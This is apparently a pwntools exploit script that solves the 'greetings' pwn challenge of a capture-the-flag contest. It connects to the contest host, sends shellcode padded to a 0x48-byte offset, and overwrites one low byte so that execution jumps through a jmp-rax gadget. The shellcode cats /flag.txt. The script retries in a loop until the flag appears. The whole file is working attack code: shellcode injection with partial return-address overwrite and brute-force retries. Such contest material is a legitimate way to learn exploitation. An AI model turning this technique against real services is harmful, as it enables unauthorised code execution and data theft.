#!/usr/bin/env python3
from pwn import *
import time

PORT = 31373
HOST = "tjc.tf"
elf = context.binary = ELF('./greetings', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

#GDB()

path = "/flag.txt" if args.REMOTE else "flag.txt"
shellcode = asm(shellcraft.cat(path))

jmp_rax_low_byte = b'\xdf'

offset = 0x48

payload = flat(
    shellcode.ljust(offset, b'A'),
    jmp_rax_low_byte,
)

while True:
    try:
        p = conn()
        p.sendline(str(len(payload)-1).encode())
        p.sendline(payload)

        data = p.recvrepeat(0.5)
        if b"tjctf{" in data:
            print(data.decode(errors="ignore"))
            p.close()
            break

        p.close()
        time.sleep(0.05)
    except (EOFError, PwnlibException):
        try:
            p.close()
        except Exception:
            pass
        time.sleep(0.1)
